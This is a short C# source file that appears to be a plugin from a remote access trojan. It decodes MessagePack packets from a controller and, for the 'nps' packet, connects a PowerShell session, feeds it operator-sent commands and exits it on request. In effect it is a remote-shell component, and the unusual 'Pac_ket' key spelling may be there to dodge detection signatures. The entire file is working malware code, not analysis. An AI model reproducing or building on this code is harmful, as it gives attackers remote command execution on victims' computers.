using MessagePackLib.MessagePack;
using System;
using Plugin.Handler;
using System.Collections.Generic;
using System.Diagnostics;
using System.Drawing;
using System.Drawing.Imaging;
using System.IO;
using System.Linq;
using System.Management;
using System.Runtime.InteropServices;
using System.Text;
using System.Threading;

namespace Plugin
{
    public static class Packet
    {
        public static void Read(object data)
        {
            MsgPack unpack_msgpack = new MsgPack();
            unpack_msgpack.DecodeFromBytes((byte[])data);
            switch (unpack_msgpack.ForcePathObject("Pac_ket").AsString)
            {
                case "nps":
                    {
                        switch (unpack_msgpack.ForcePathObject("Send").AsString)
                        {
                            case "Connect":
                                {
                                    new HandlePowershell().Connect();
                                    break;
                                }

                            case "WriteInput":
                                {
                                    new HandlePowershell().CommandHandler(unpack_msgpack.ForcePathObject("Command").AsString);
                                    break;
                                }

                            case "Exit":
                                {
                                    new HandlePowershell().Exit();
                                    break;
                                }
                        }                        
                    }
                    break;

            }
        }
    }

}
